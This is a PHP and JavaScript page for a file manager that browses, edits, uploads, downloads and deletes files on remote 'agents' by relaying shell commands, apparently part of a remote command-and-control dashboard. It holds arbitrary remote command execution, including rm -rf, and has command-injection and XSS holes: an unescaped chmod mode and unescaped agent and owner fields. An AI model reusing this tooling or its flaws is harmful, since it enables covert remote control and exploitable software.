<?php
session_start();
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    header('Location: login.php?redirect=fileman.php?' . $_SERVER['QUERY_STRING']);
    exit;
}
$agent_id = $_GET['agent'] ?? '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0e12;
            color: #e1e4e8;
            font-family: 'SF Mono','Fira Code','Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Top Bar */
        .topbar {
            background: #161b22;
            border-bottom: 1px solid #21262d;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .topbar .logo { color: #58a6ff; font-weight: 700; font-size: 14px; }
        .topbar select {
            background: #0d1117; border: 1px solid #30363d; color: #e1e4e8;
            padding: 6px 10px; border-radius: 6px; font-family: inherit; font-size: 12px;
        }
        .topbar select:focus { outline: none; border-color: #58a6ff; }
        .topbar .status { margin-left: auto; font-size: 11px; }
        .topbar .status.on { color: #3fb950; }
        .topbar .status.off { color: #f85149; }
        .topbar a {
            color: #8b949e; text-decoration: none; font-size: 12px;
            padding: 4px 10px; border: 1px solid #30363d; border-radius: 6px;
        }
        .topbar a:hover { color: #e1e4e8; border-color: #484f58; }

        /* Path Bar */
        .pathbar {
            background: #161b22;
            border-bottom: 1px solid #21262d;
            padding: 8px 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .pathbar input {
            flex: 1; background: #0d1117; border: 1px solid #30363d; color: #58a6ff;
            padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 13px;
        }
        .pathbar input:focus { outline: none; border-color: #58a6ff; }
        .pathbar button, .toolbar button {
            background: #21262d; border: 1px solid #30363d; color: #e1e4e8;
            padding: 7px 14px; border-radius: 6px; cursor: pointer; font-family: inherit;
            font-size: 12px; transition: all 0.15s; white-space: nowrap;
        }
        .pathbar button:hover, .toolbar button:hover {
            background: #30363d; border-color: #484f58;
        }

        /* Toolbar */
        .toolbar {
            background: #0d1117;
            border-bottom: 1px solid #21262d;
            padding: 8px 20px;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .toolbar button.accent { background: #238636; border-color: #238636; }
        .toolbar button.accent:hover { background: #2ea043; }
        .toolbar button.danger { color: #f85149; border-color: #f8514930; }
        .toolbar button.danger:hover { background: #f8514920; }
        .toolbar .sep { width: 1px; background: #21262d; margin: 0 4px; }

        /* Main Content */
        .main { flex: 1; display: flex; overflow: hidden; }

        /* File List */
        .filelist {
            flex: 1;
            overflow-y: auto;
            padding: 0;
        }
        .filelist table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .filelist th {
            background: #161b22;
            padding: 8px 16px;
            text-align: left;
            font-size: 11px;
            color: #8b949e;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #21262d;
            position: sticky;
            top: 0;
            z-index: 1;
        }
        .filelist tr { border-bottom: 1px solid #161b2280; }
        .filelist tr:hover { background: #161b22; }
        .filelist tr.selected { background: #1f6feb20; }
        .filelist td { padding: 6px 16px; cursor: default; }
        .filelist .fname {
            color: #e1e4e8; cursor: pointer; display: flex; align-items: center; gap: 8px;
        }
        .filelist .fname:hover { color: #58a6ff; }
        .filelist .fname .icon { width: 18px; text-align: center; flex-shrink: 0; }
        .filelist .fsize { color: #8b949e; font-size: 12px; text-align: right; }
        .filelist .fperms { color: #6e7681; font-size: 12px; }
        .filelist .fdate { color: #8b949e; font-size: 12px; }
        .filelist .fowner { color: #6e7681; font-size: 12px; }

        /* Editor Panel */
        .editor-panel {
            display: none;
            flex-direction: column;
            width: 100%;
            height: 100%;
        }
        .editor-panel.show { display: flex; }
        .editor-header {
            background: #161b22;
            padding: 10px 16px;
            border-bottom: 1px solid #21262d;
            display: flex; justify-content: space-between; align-items: center;
            flex-shrink: 0;
        }
        .editor-header .ename { color: #58a6ff; font-size: 13px; font-weight: 600; }
        .editor-header button {
            background: #21262d; border: 1px solid #30363d; color: #e1e4e8;
            padding: 5px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;
            font-family: inherit;
        }
        .editor-header .save-btn { background: #238636; border-color: #238636; }
        .editor-header .save-btn:hover { background: #2ea043; }
        .editor-area {
            flex: 1; padding: 0; overflow: hidden;
        }
        .editor-area textarea {
            width: 100%; height: 100%; background: #0a0e12; color: #7ee787;
            border: none; padding: 16px; font-family: 'Courier New', monospace;
            font-size: 13px; line-height: 1.6; resize: none; tab-size: 4;
        }
        .editor-area textarea:focus { outline: none; }

        /* Upload Overlay */
        .overlay {
            display: none; position: fixed; inset: 0; background: #0008;
            z-index: 100; justify-content: center; align-items: center;
        }
        .overlay.show { display: flex; }
        .overlay .modal {
            background: #161b22; border: 1px solid #30363d; border-radius: 12px;
            padding: 24px; width: 480px; max-width: 90vw;
        }
        .overlay .modal h3 { color: #e1e4e8; margin-bottom: 16px; font-size: 16px; }
        .overlay .modal input[type=text] {
            width: 100%; background: #0d1117; border: 1px solid #30363d; color: #e1e4e8;
            padding: 10px 12px; border-radius: 6px; font-family: inherit; margin-bottom: 12px;
        }
        .overlay .modal input[type=text]:focus { outline: none; border-color: #58a6ff; }
        .dropzone {
            border: 2px dashed #30363d; border-radius: 8px; padding: 40px;
            text-align: center; color: #8b949e; cursor: pointer; transition: all 0.2s;
            margin-bottom: 16px;
        }
        .dropzone:hover, .dropzone.drag { border-color: #58a6ff; color: #58a6ff; }
        .dropzone input { display: none; }
        .modal-actions { display: flex; gap: 8px; justify-content: flex-end; }
        .modal-actions button {
            padding: 8px 18px; border-radius: 6px; border: 1px solid #30363d;
            font-family: inherit; cursor: pointer; font-size: 13px;
        }
        .modal-actions .cancel { background: #21262d; color: #e1e4e8; }
        .modal-actions .confirm { background: #238636; color: #fff; border-color: #238636; }

        /* Loading */
        .loading-bar {
            height: 2px; background: #0d1117; position: relative; overflow: hidden;
            display: none;
        }
        .loading-bar.active { display: block; }
        .loading-bar::after {
            content: ''; position: absolute; left: -40%; width: 40%; height: 100%;
            background: #58a6ff; animation: loadslide 1s infinite;
        }
        @keyframes loadslide {
            0% { left: -40%; } 100% { left: 100%; }
        }

        /* Context Menu */
        .ctxmenu {
            display: none; position: fixed; background: #161b22;
            border: 1px solid #30363d; border-radius: 8px;
            padding: 4px 0; z-index: 200; min-width: 180px;
            box-shadow: 0 8px 24px #0008;
        }
        .ctxmenu.show { display: block; }
        .ctxmenu div {
            padding: 8px 16px; font-size: 12px; cursor: pointer; color: #e1e4e8;
        }
        .ctxmenu div:hover { background: #21262d; }
        .ctxmenu div.danger { color: #f85149; }
        .ctxmenu .sep { height: 1px; background: #21262d; padding: 0; margin: 4px 0; cursor: default; }

        .filelist::-webkit-scrollbar { width: 6px; }
        .filelist::-webkit-scrollbar-track { background: transparent; }
        .filelist::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="topbar">
        <span class="logo">📁 File Manager</span>
        <select id="agentSelect" onchange="switchAgent(this.value)">
            <option value="">Select Agent...</option>
        </select>
        <span class="status off" id="connStatus">● Disconnected</span>
        <a href="udp_dashboard.php">← Dashboard</a>
    </div>

    <div class="pathbar">
        <button onclick="navigate('..')" title="Up">⬆</button>
        <button onclick="navigate('/')" title="Root">/</button>
        <input type="text" id="pathInput" placeholder="/path" value="/" onkeydown="if(event.key==='Enter')navigate(this.value)">
        <button onclick="navigate(document.getElementById('pathInput').value)">Go</button>
        <button onclick="refresh()">↻</button>
    </div>

    <div class="toolbar">
        <button class="accent" onclick="showUpload()">⬆ Upload</button>
        <button onclick="showNewFile()">+ New File</button>
        <button onclick="showNewDir()">📁 New Folder</button>
        <div class="sep"></div>
        <button onclick="editSelected()">✏️ Edit</button>
        <button onclick="downloadSelected()">⬇ Download</button>
        <button onclick="chmodSelected()">🔒 Chmod</button>
        <div class="sep"></div>
        <button class="danger" onclick="deleteSelected()">🗑 Delete</button>
        <div class="sep"></div>
        <button onclick="clearAgentResults()" title="Fix stuck agent">🔧 Fix Agent</button>
    </div>

    <div class="loading-bar" id="loadbar"></div>

    <div class="main">
        <div class="filelist" id="filelistWrap">
            <table>
                <thead>
                    <tr>
                        <th style="width:30px"><input type="checkbox" id="selectAll" onchange="toggleSelectAll(this)"></th>
                        <th>Name</th>
                        <th style="width:100px">Size</th>
                        <th style="width:110px">Permissions</th>
                        <th style="width:120px">Owner</th>
                        <th style="width:140px">Modified</th>
                    </tr>
                </thead>
                <tbody id="filelist"></tbody>
            </table>
        </div>

        <div class="editor-panel" id="editorPanel">
            <div class="editor-header">
                <span class="ename" id="editorName">file.txt</span>
                <div style="display:flex;gap:6px">
                    <button class="save-btn" onclick="saveFile()">💾 Save</button>
                    <button onclick="closeEditor()">✕ Close</button>
                </div>
            </div>
            <div class="editor-area">
                <textarea id="editorContent" spellcheck="false"></textarea>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div class="overlay" id="uploadModal">
        <div class="modal">
            <h3>⬆ Upload File</h3>
            <div class="dropzone" id="dropzone" onclick="document.getElementById('fileInput').click()"
                 ondragover="event.preventDefault();this.classList.add('drag')"
                 ondragleave="this.classList.remove('drag')"
                 ondrop="event.preventDefault();this.classList.remove('drag');handleDrop(event)">
                Drop file here or click to browse
                <input type="file" id="fileInput" onchange="handleFileSelect(this)">
            </div>
            <div id="uploadInfo" style="color:#8b949e;font-size:12px;margin-bottom:12px"></div>
            <div class="modal-actions">
                <button class="cancel" onclick="hideUpload()">Cancel</button>
                <button class="confirm" id="uploadBtn" onclick="doUpload()" disabled>Upload</button>
            </div>
        </div>
    </div>

    <!-- New File/Dir Modal -->
    <div class="overlay" id="newModal">
        <div class="modal">
            <h3 id="newModalTitle">New File</h3>
            <input type="text" id="newNameInput" placeholder="filename.txt">
            <div class="modal-actions">
                <button class="cancel" onclick="hideNew()">Cancel</button>
                <button class="confirm" onclick="doCreate()">Create</button>
            </div>
        </div>
    </div>

    <!-- Download/Upload Progress Modal -->
    <div class="overlay" id="progressModal">
        <div class="modal" style="text-align:center">
            <h3 id="progressTitle">⬇ Downloading...</h3>
            <div style="margin:16px 0">
                <div style="background:#21262d;border-radius:6px;height:8px;overflow:hidden">
                    <div id="progressBar" style="background:#58a6ff;height:100%;width:0%;transition:width 0.3s;border-radius:6px"></div>
                </div>
                <div id="progressText" style="color:#8b949e;font-size:12px;margin-top:8px">0%</div>
            </div>
            <button class="cancel" onclick="cancelTransfer()" style="background:#21262d;border:1px solid #30363d;color:#e1e4e8;padding:7px 18px;border-radius:6px;cursor:pointer;font-family:inherit">Cancel</button>
        </div>
    </div>

    <!-- Context Menu -->
    <div class="ctxmenu" id="ctxmenu">
        <div onclick="editCtx()">✏️ Edit</div>
        <div onclick="downloadCtx()">⬇ Download</div>
        <div onclick="renameCtx()">📝 Rename</div>
        <div onclick="chmodCtx()">🔒 Chmod</div>
        <div class="sep"></div>
        <div class="danger" onclick="deleteCtx()">🗑 Delete</div>
    </div>

    <script>
    const API = 'udp_api.php';
    let agentId = '<?php echo addslashes($agent_id); ?>';
    let cwd = '/';
    let files = [];
    let selectedFiles = new Set();
    let pendingFile = null;
    let createMode = 'file';
    let ctxFile = null;
    let pollTimer = null;
    let waitingFor = null;

    /* Agent loading */
    function clearAgentResults() {
        if (!agentId) return flash('Select an agent first');
        fetch(`${API}?action=clear_results&agent_id=${encodeURIComponent(agentId)}`)
            .then(r => r.json())
            .then(() => { flash('Agent results cleared'); refresh(); });
    }

    async function loadAgents() {
        const resp = await fetch(`${API}?action=list_agents`);
        const agents = await resp.json();
        const sel = document.getElementById('agentSelect');
        sel.innerHTML = '<option value="">Select Agent...</option>';
        agents.forEach(a => {
            const id = a.id || a.secret_key;
            const name = a.name || id.substring(0,8);
            const dot = a.online ? '🟢' : '🔴';
            sel.innerHTML += `<option value="${id}" ${id===agentId?'selected':''}>${dot} ${name}</option>`;
        });
        if (agentId) updateStatus(agents.find(a => (a.id||a.secret_key) === agentId));
    }

    function switchAgent(id) {
        agentId = id;
        if (id) { cwd = '/'; navigate('/'); }
    }

    function updateStatus(agent) {
        const s = document.getElementById('connStatus');
        if (agent && agent.online) { s.className = 'status on'; s.textContent = '● Connected'; }
        else { s.className = 'status off'; s.textContent = '● Disconnected'; }
    }

    /* Command execution via existing API */
    async function sendCmd(cmd) {
        const fd = new FormData();
        fd.append('action', 'send_command');
        fd.append('agent_id', agentId);
        fd.append('command', cmd);
        await fetch(API, { method: 'POST', body: fd });
    }

    async function getResults() {
        const resp = await fetch(`${API}?action=get_results&agent_id=${encodeURIComponent(agentId)}&limit=5`);
        return await resp.json();
    }

    /* Wait for a command result with marker */
    function execAndWait(cmd, callback, timeout=15000) {
        const marker = 'FM_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
        const wrappedCmd = `${cmd}; echo "${marker}"`;

        loading(true);
        sendCmd(wrappedCmd);

        let elapsed = 0;
        const interval = 500;

        if (pollTimer) clearInterval(pollTimer);
        pollTimer = setInterval(async () => {
            elapsed += interval;
            if (elapsed > timeout) {
                clearInterval(pollTimer);
                pollTimer = null;
                loading(false);
                return;
            }
            const results = await getResults();
            if (!results || !results.length) return;

            for (let i = results.length - 1; i >= 0; i--) {
                if (results[i].output && results[i].output.includes(marker)) {
                    clearInterval(pollTimer);
                    pollTimer = null;
                    loading(false);
                    const output = results[i].output.replace(marker, '').replace(/\n$/, '');
                    callback(output);
                    return;
                }
            }
        }, interval);
    }

    function loading(on) {
        document.getElementById('loadbar').classList.toggle('active', on);
    }

    /* Navigation */
    function navigate(path) {
        if (!agentId) return;
        if (path === '..') {
            const parts = cwd.replace(/\/+$/, '').split('/');
            parts.pop();
            path = parts.join('/') || '/';
        }
        if (!path.startsWith('/')) path = cwd.replace(/\/+$/, '') + '/' + path;
        cwd = path;
        document.getElementById('pathInput').value = cwd;
        selectedFiles.clear();
        closeEditor();
        listFiles();
    }

    function refresh() { listFiles(); }

    function listFiles() {
        const cmd = `ls -la --time-style=long-iso ${shellEsc(cwd)} 2>&1`;
        execAndWait(cmd, output => {
            files = parseLs(output);
            renderFiles();
        });
    }

    function parseLs(output) {
        const lines = output.split('\n').filter(l => l && !l.startsWith('total'));
        return lines.map(line => {
            const parts = line.match(/^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$/);
            if (!parts) return null;
            const name = parts[8];
            if (name === '.' || name === '..') return null;
            return {
                perms: parts[1],
                links: parts[2],
                owner: parts[3],
                group: parts[4],
                size: parts[5],
                date: parts[6],
                time: parts[7],
                name: name,
                isDir: parts[1].startsWith('d'),
                isLink: parts[1].startsWith('l')
            };
        }).filter(Boolean);
    }

    function renderFiles() {
        const tbody = document.getElementById('filelist');
        if (!files.length) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:40px;color:#8b949e">Empty directory</td></tr>';
            return;
        }

        // Sort: dirs first, then by name
        files.sort((a,b) => {
            if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
            return a.name.localeCompare(b.name);
        });

        tbody.innerHTML = files.map((f, i) => {
            const icon = f.isDir ? '📁' : f.isLink ? '🔗' : getIcon(f.name);
            const sel = selectedFiles.has(f.name) ? 'selected' : '';
            const sz = f.isDir ? '-' : humanSize(parseInt(f.size));
            return `<tr class="${sel}" data-idx="${i}" oncontextmenu="showCtx(event,${i})">
                <td><input type="checkbox" ${sel?'checked':''} onchange="toggleSelect('${esc(f.name)}',this.checked)"></td>
                <td><span class="fname" onclick="clickFile(${i})"><span class="icon">${icon}</span>${esc(f.name)}</span></td>
                <td class="fsize">${sz}</td>
                <td class="fperms">${f.perms}</td>
                <td class="fowner">${f.owner}:${f.group}</td>
                <td class="fdate">${f.date} ${f.time}</td>
            </tr>`;
        }).join('');
    }

    function clickFile(idx) {
        const f = files[idx];
        if (f.isDir) {
            navigate(f.name.includes(' -> ') ? f.name.split(' -> ')[1] : f.name);
        } else {
            editFile(f.name);
        }
    }

    /* File operations */
    function editFile(name) {
        const fullpath = cwd.replace(/\/+$/, '') + '/' + name;
        execAndWait(`cat ${shellEsc(fullpath)} 2>&1`, output => {
            document.getElementById('editorName').textContent = name;
            document.getElementById('editorContent').value = output;
            document.getElementById('filelistWrap').style.display = 'none';
            document.getElementById('editorPanel').classList.add('show');
            document.getElementById('editorContent')._path = fullpath;
        });
    }

    function saveFile() {
        const content = document.getElementById('editorContent').value;
        const path = document.getElementById('editorContent')._path;
        const b64 = btoa(unescape(encodeURIComponent(content)));
        execAndWait(`echo '${b64}' | base64 -d > ${shellEsc(path)} 2>&1 && echo "SAVED OK"`, output => {
            if (output.includes('SAVED OK')) {
                flash('File saved');
            }
        });
    }

    function closeEditor() {
        document.getElementById('editorPanel').classList.remove('show');
        document.getElementById('filelistWrap').style.display = '';
    }

    function deleteSelected() {
        const sel = getSelected();
        if (!sel.length) return;
        if (!confirm(`Delete ${sel.length} item(s)?`)) return;
        const paths = sel.map(n => shellEsc(cwd.replace(/\/+$/,'') + '/' + n)).join(' ');
        execAndWait(`rm -rf ${paths} 2>&1 && echo "DEL OK"`, () => refresh());
    }

    let transferCancelled = false;
    let activeDlId = null;

    function cancelTransfer() {
        transferCancelled = true;
        if (activeDlId) {
            fetch(`${API}?action=download_cleanup&dl_id=${activeDlId}`);
            activeDlId = null;
        }
        document.getElementById('progressModal').classList.remove('show');
    }

    function showProgress(title) {
        transferCancelled = false;
        document.getElementById('progressTitle').textContent = title;
        document.getElementById('progressBar').style.width = '0%';
        document.getElementById('progressText').textContent = 'Starting...';
        document.getElementById('progressModal').classList.add('show');
    }

    function updateProgress(pct, text) {
        document.getElementById('progressBar').style.width = pct + '%';
        document.getElementById('progressText').textContent = text || (Math.round(pct) + '%');
    }

    let dlStartTime = 0;
    let dlLastBytes = 0;
    let dlLastTime = 0;
    let dlSpeed = 0;

    function downloadSelected() {
        const sel = getSelected();
        if (sel.length !== 1) return flash('Select one file');
        const f = files.find(x => x.name === sel[0]);
        if (f && f.isDir) return flash('Cannot download directory');
        const fname = sel[0];
        const path = cwd.replace(/\/+$/, '') + '/' + fname;

        showProgress('⬇ Downloading ' + fname);
        dlStartTime = Date.now();
        dlLastBytes = 0;
        dlLastTime = Date.now();
        dlSpeed = 0;

        // Start relay download
        fetch(`${API}?action=start_download&agent_id=${encodeURIComponent(agentId)}&path=${encodeURIComponent(path)}`)
            .then(r => r.json())
            .then(data => {
                if (data.error) {
                    document.getElementById('progressModal').classList.remove('show');
                    return flash('Download failed: ' + data.error);
                }
                activeDlId = data.dl_id;
                pollDownload(data.dl_id, fname);
            })
            .catch(e => {
                document.getElementById('progressModal').classList.remove('show');
                flash('Download failed');
            });
    }

    function pollDownload(dl_id, fname) {
        if (transferCancelled) return;

        fetch(`${API}?action=download_status&dl_id=${dl_id}`)
            .then(r => r.json())
            .then(data => {
                if (transferCancelled) return;

                if (data.status === 'error') {
                    document.getElementById('progressModal').classList.remove('show');
                    flash('Download error: ' + (data.error || 'unknown'));
                    return;
                }

                if (data.status === 'done') {
                    updateProgress(100, 'Saving...');
                    const a = document.createElement('a');
                    a.href = `${API}?action=download_file&dl_id=${dl_id}&filename=${encodeURIComponent(fname)}`;
                    a.download = fname;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    setTimeout(() => {
                        fetch(`${API}?action=download_cleanup&dl_id=${dl_id}`);
                        activeDlId = null;
                    }, 5000);
                    document.getElementById('progressModal').classList.remove('show');
                    flash('Download complete: ' + fname);
                    return;
                }

                // In progress
                const pct = data.pct || 0;
                const recv = data.received || 0;
                const total = data.transfer_size || data.size || 0;
                const origSize = data.size || 0;
                const isGz = data.compressed || 0;
                if (total > 0) {
                    const now = Date.now();
                    if (now - dlLastTime >= 1000) {
                        dlSpeed = (recv - dlLastBytes) / ((now - dlLastTime) / 1000);
                        dlLastBytes = recv;
                        dlLastTime = now;
                    }
                    const speedStr = dlSpeed > 0 ? humanSize(dlSpeed) + '/s' : '...';
                    const remain = total - recv;
                    const eta = dlSpeed > 0 ? Math.ceil(remain / dlSpeed) : 0;
                    const etaStr = eta > 60 ? Math.floor(eta/60) + 'm ' + (eta%60) + 's' : eta + 's';
                    const gzInfo = isGz ? ` [gz: ${humanSize(total)} → ${humanSize(origSize)}]` : '';
                    updateProgress(pct, `${humanSize(recv)} / ${humanSize(total)} — ${speedStr} — ${etaStr}${gzInfo}`);
                } else {
                    updateProgress(0, `Compressing & starting...`);
                }
                setTimeout(() => pollDownload(dl_id, fname), 500);
            })
            .catch(() => {
                if (!transferCancelled) setTimeout(() => pollDownload(dl_id, fname), 1000);
            });
    }

    function chmodSelected() {
        const sel = getSelected();
        if (!sel.length) return;
        const mode = prompt('Enter permissions (e.g. 755, 644):', '644');
        if (!mode) return;
        const paths = sel.map(n => shellEsc(cwd.replace(/\/+$/,'') + '/' + n)).join(' ');
        execAndWait(`chmod ${mode} ${paths} 2>&1 && echo "CHMOD OK"`, () => refresh());
    }

    function editSelected() {
        const sel = getSelected();
        if (sel.length !== 1) return flash('Select one file');
        const f = files.find(x => x.name === sel[0]);
        if (f && f.isDir) return flash('Cannot edit directory');
        editFile(sel[0]);
    }

    /* Upload */
    function showUpload() { document.getElementById('uploadModal').classList.add('show'); }
    function hideUpload() {
        document.getElementById('uploadModal').classList.remove('show');
        pendingFile = null;
        document.getElementById('uploadInfo').textContent = '';
        document.getElementById('uploadBtn').disabled = true;
    }

    function handleDrop(e) {
        if (e.dataTransfer.files.length) setUploadFile(e.dataTransfer.files[0]);
    }
    function handleFileSelect(input) {
        if (input.files.length) setUploadFile(input.files[0]);
    }
    function setUploadFile(file) {
        pendingFile = file;
        document.getElementById('uploadInfo').textContent = `${file.name} (${humanSize(file.size)})`;
        document.getElementById('uploadBtn').disabled = false;
    }

    async function doUpload() {
        if (!pendingFile) return;
        const fname = pendingFile.name;
        const dest = cwd.replace(/\/+$/, '') + '/' + fname;
        const size = pendingFile.size;

        hideUpload();
        showProgress('⬆ Uploading ' + fname);

        const reader = new FileReader();
        reader.onload = function() {
            const b64 = reader.result.split(',')[1];
            const CHUNK = 30000; // base64 chars per chunk (safe for shell arg)
            const totalChunks = Math.ceil(b64.length / CHUNK);
            let current = 0;

            function nextChunk() {
                if (transferCancelled) {
                    execAndWait(`rm -f /tmp/.fm_up 2>&1`, () => {});
                    return;
                }
                if (current >= totalChunks) {
                    // Final: decode and move
                    updateProgress(95, 'Finalizing...');
                    execAndWait(
                        `base64 -d /tmp/.fm_up > ${shellEsc(dest)} 2>&1 && rm -f /tmp/.fm_up && echo "UP OK"`,
                        output => {
                            document.getElementById('progressModal').classList.remove('show');
                            if (output.includes('UP OK')) flash('Upload complete');
                            else flash('Upload may have failed');
                            refresh();
                        },
                        30000
                    );
                    return;
                }

                const pct = (current / totalChunks) * 90;
                const uploaded = Math.min(current * CHUNK, b64.length);
                updateProgress(pct, `${humanSize(uploaded * 0.75)} / ${humanSize(size)}`);

                const chunk = b64.slice(current * CHUNK, (current + 1) * CHUNK);
                const op = current === 0 ? '>' : '>>';
                execAndWait(
                    `printf '%s' '${chunk}' ${op} /tmp/.fm_up`,
                    () => { current++; nextChunk(); },
                    15000
                );
            }

            nextChunk();
        };
        reader.readAsDataURL(pendingFile);
    }

    /* New file/dir */
    function showNewFile() {
        createMode = 'file';
        document.getElementById('newModalTitle').textContent = 'New File';
        document.getElementById('newNameInput').placeholder = 'filename.txt';
        document.getElementById('newNameInput').value = '';
        document.getElementById('newModal').classList.add('show');
        setTimeout(() => document.getElementById('newNameInput').focus(), 100);
    }
    function showNewDir() {
        createMode = 'dir';
        document.getElementById('newModalTitle').textContent = 'New Folder';
        document.getElementById('newNameInput').placeholder = 'folder-name';
        document.getElementById('newNameInput').value = '';
        document.getElementById('newModal').classList.add('show');
        setTimeout(() => document.getElementById('newNameInput').focus(), 100);
    }
    function hideNew() { document.getElementById('newModal').classList.remove('show'); }

    function doCreate() {
        const name = document.getElementById('newNameInput').value.trim();
        if (!name) return;
        const path = cwd.replace(/\/+$/, '') + '/' + name;
        const cmd = createMode === 'dir'
            ? `mkdir -p ${shellEsc(path)} 2>&1 && echo "OK"`
            : `touch ${shellEsc(path)} 2>&1 && echo "OK"`;
        execAndWait(cmd, () => { hideNew(); refresh(); });
    }

    /* Context menu */
    function showCtx(e, idx) {
        e.preventDefault();
        ctxFile = files[idx];
        const menu = document.getElementById('ctxmenu');
        menu.style.left = e.clientX + 'px';
        menu.style.top = e.clientY + 'px';
        menu.classList.add('show');
    }
    document.addEventListener('click', () => document.getElementById('ctxmenu').classList.remove('show'));

    function editCtx() { if (ctxFile && !ctxFile.isDir) editFile(ctxFile.name); }
    function downloadCtx() {
        if (ctxFile) { selectedFiles.clear(); selectedFiles.add(ctxFile.name); downloadSelected(); }
    }
    function renameCtx() {
        if (!ctxFile) return;
        const newName = prompt('Rename to:', ctxFile.name);
        if (!newName || newName === ctxFile.name) return;
        const src = cwd.replace(/\/+$/, '') + '/' + ctxFile.name;
        const dst = cwd.replace(/\/+$/, '') + '/' + newName;
        execAndWait(`mv ${shellEsc(src)} ${shellEsc(dst)} 2>&1 && echo "REN OK"`, () => refresh());
    }
    function chmodCtx() {
        if (!ctxFile) return;
        selectedFiles.clear(); selectedFiles.add(ctxFile.name); chmodSelected();
    }
    function deleteCtx() {
        if (!ctxFile) return;
        selectedFiles.clear(); selectedFiles.add(ctxFile.name); deleteSelected();
    }

    /* Selection */
    function toggleSelect(name, checked) {
        if (checked) selectedFiles.add(name); else selectedFiles.delete(name);
        renderFiles();
    }
    function toggleSelectAll(cb) {
        files.forEach(f => { if (cb.checked) selectedFiles.add(f.name); else selectedFiles.delete(f.name); });
        renderFiles();
    }
    function getSelected() { return [...selectedFiles]; }

    /* Helpers */
    function shellEsc(s) { return "'" + s.replace(/'/g, "'\\''") + "'"; }
    function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
    function humanSize(b) {
        if (isNaN(b)) return '-';
        const u = ['B','KB','MB','GB'];
        let i = 0;
        while (b >= 1024 && i < 3) { b /= 1024; i++; }
        return b.toFixed(i ? 1 : 0) + ' ' + u[i];
    }
    function getIcon(name) {
        const ext = name.split('.').pop().toLowerCase();
        const map = {
            js:'📜',ts:'📜',py:'🐍',php:'🐘',c:'⚙️',h:'⚙️',sh:'⚙️',
            html:'🌐',css:'🎨',json:'📋',xml:'📋',yml:'📋',yaml:'📋',
            md:'📝',txt:'📄',log:'📄',conf:'📄',cfg:'📄',ini:'📄',
            jpg:'🖼',jpeg:'🖼',png:'🖼',gif:'🖼',svg:'🖼',webp:'🖼',
            zip:'📦',tar:'📦',gz:'📦',bz2:'📦',xz:'📦',rar:'📦',
            pdf:'📕',doc:'📘',xls:'📗',
            so:'🔧',o:'🔧',bin:'🔧',exe:'🔧',
            key:'🔑',pem:'🔑',crt:'🔑',
        };
        return map[ext] || '📄';
    }
    function flash(msg) {
        const d = document.createElement('div');
        d.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#238636;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;z-index:300;animation:slideIn 0.3s';
        d.textContent = msg;
        document.body.appendChild(d);
        setTimeout(() => d.remove(), 2500);
    }

    /* Keyboard */
    document.getElementById('newNameInput').addEventListener('keydown', e => { if (e.key === 'Enter') doCreate(); });

    /* Init */
    loadAgents().then(() => { if (agentId) navigate('/'); });
    </script>
</body>
</html>